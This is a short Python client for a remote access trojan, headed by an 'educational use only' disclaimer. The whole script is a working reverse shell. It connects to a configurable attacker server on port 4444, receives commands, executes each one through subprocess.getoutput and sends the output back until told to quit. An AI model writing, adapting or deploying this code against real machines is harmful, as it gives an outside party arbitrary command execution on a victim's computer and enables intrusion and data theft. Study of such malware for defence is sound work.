#This project is solely for educational use. The author does not authorize
#the use of this project for any malicious or illegal actions.

import os
import socket
import subprocess

#create socket object
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#RATServer should be set to the IP of the RAT server
#victimPort should be set to the port that the client talks to the RAT Server through
RATServer = ""
RATPort = 4444
victimPort = ""

#Start the connection to the RAT server
s.connect((RATServer, RATPort))

while True:
    #get the instruction from the RAT server and execute it
    command = s.recv(4096)
    command = command.decode("UTF-8")
    print("You entered: ", command)

    #exit the session if the RAT server enters "quit"
    if command == "quit":
        print("Exiting connection...")
        break

    output = "===Output===\n"
    output += subprocess.getoutput(command)
    output = output.encode("UTF-8")

    s.send(output)
    output = ""